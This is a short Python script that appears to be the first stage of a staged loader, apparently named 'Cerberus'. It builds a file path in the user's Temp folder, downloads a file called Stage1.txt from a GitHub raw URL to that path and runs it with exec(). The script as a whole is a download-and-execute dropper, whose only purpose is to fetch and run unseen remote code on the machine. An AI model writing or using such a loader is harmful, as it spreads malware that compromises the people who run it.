import os.path
import urllib.request
from bs4 import BeautifulSoup

path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1Host.py")

if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
    file = open('Stage1Host.py', 'a')
    file.close()


# Retrieves code from URL and appends it into Stage1 created earlier 
urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt", path)  

# Runs the Stage1 file
exec(open(path).read())  
